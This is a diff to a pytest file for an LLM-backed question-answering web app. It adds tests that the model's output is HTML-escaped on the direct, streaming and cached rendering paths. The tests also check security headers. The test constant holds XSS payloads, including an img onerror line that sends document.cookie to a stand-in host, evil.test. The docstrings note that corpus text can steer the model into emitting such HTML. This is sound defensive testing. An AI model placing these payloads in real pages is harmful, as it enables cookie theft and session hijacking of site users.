@@ -4,6 +4,7 @@ from __future__ import annotations
 
 import base64
 import json
+import re
 import sqlite3
 from pathlib import Path
 
@@ -429,6 +430,74 @@ def test_robots_txt_disallows_ask(file_db: Path, monkeypatch: pytest.MonkeyPatch
     monkeypatch.delenv("WENJI_SITE_URL")
     c2 = _make_client(file_db, llm=_FakeLLM())
     assert c2.get("/robots.txt").text == "User-agent: *\nDisallow: /\n"
+
+
+_XSS_PAYLOAD = (
+    "正常開頭\n\n"
+    '<img src=x onerror="fetch(`https://evil.test/?c=`+document.cookie)">\n\n'
+    "<script>alert(document.domain)</script>\n\n"
+    '<a href="javascript:alert(1)">click</a>\n\n'
+    "**粗體仍要正常**"
+)
+
+
+_MARKDOWN_TAGS = {
+    "p", "/p", "strong", "/strong", "em", "/em", "code", "/code",
+    "pre", "/pre", "br", "hr", "blockquote", "/blockquote",
+    "ul", "/ul", "ol", "/ol", "li", "/li",
+    "h1", "/h1", "h2", "/h2", "h3", "/h3", "h4", "/h4", "h5", "/h5", "h6", "/h6",
+    "a", "/a", "table", "/table", "thead", "/thead", "tbody", "/tbody",
+    "tr", "/tr", "th", "/th", "td", "/td",
+}  # fmt: skip
+
+
+def _assert_no_live_html(html: str) -> None:
+    """Every tag in the output must be one the markdown renderer emitted.
+
+    Substring checks are the wrong tool here: an escaped payload legitimately
+    contains the text ``onerror``. What matters is that no attacker-supplied
+    tag survives as a real element.
+    """
+    tags = {t.split()[0].lower() for t in re.findall(r"<(/?[a-zA-Z][^>]*)>", html)}
+    assert tags <= _MARKDOWN_TAGS, f"unexpected live tags: {tags - _MARKDOWN_TAGS}"
+    assert "&lt;script&gt;" in html, "payload must survive as visible, inert text"
+
+
+def test_ask_post_escapes_html_from_llm(file_db: Path) -> None:
+    """A model's output reaches the page through innerHTML, so raw HTML in it
+    must come out inert. Corpus text can steer the model, and the endpoint is
+    remote — neither is trusted input."""
+    c = _make_client(file_db, llm=_FakeLLM(response=_XSS_PAYLOAD))
+    body = c.post("/api/ask", json={"q": "因信稱義"}).json()
+    _assert_no_live_html(body["narrative_html"])
+    assert "<strong>粗體仍要正常</strong>" in body["narrative_html"]
+
+
+def test_ask_stream_done_escapes_html_from_llm(file_db: Path) -> None:
+    """The SSE done event is the default rendering path since 0.6.1."""
+    c = _make_client(file_db, llm=_StreamLLM(pieces=(_XSS_PAYLOAD,)))
+    events = _parse_sse(c.get("/api/ask/stream", params={"q": "因信稱義"}).text)
+    _assert_no_live_html(events[-1][1]["narrative_html"])
+
+
+def test_cached_poisoned_answer_is_neutralised_on_replay(file_db: Path) -> None:
+    """Sanitising at render time (not before the cache write) means answers
+    already sitting in a 30-day cache are cleaned up on the way out."""
+    llm = _FakeLLM(response=_XSS_PAYLOAD)
+    c = _make_client(file_db, llm=llm)
+    first = c.post("/api/ask", json={"q": "因信稱義"}).json()
+    second = c.post("/api/ask", json={"q": "因信稱義"}).json()
+    assert llm.calls == 1, "second call must come from cache"
+    _assert_no_live_html(second["narrative_html"])
+    assert first["narrative_html"] == second["narrative_html"]
+
+
+def test_security_headers_present(file_db: Path) -> None:
+    c = _make_client(file_db, llm=_FakeLLM())
+    h = c.get("/").headers
+    assert h["x-content-type-options"] == "nosniff"
+    assert h["x-frame-options"] == "SAMEORIGIN"
+    assert h["referrer-policy"] == "same-origin"
 
 
 def test_ask_js_ships_on_ask_page_only(file_db: Path) -> None:
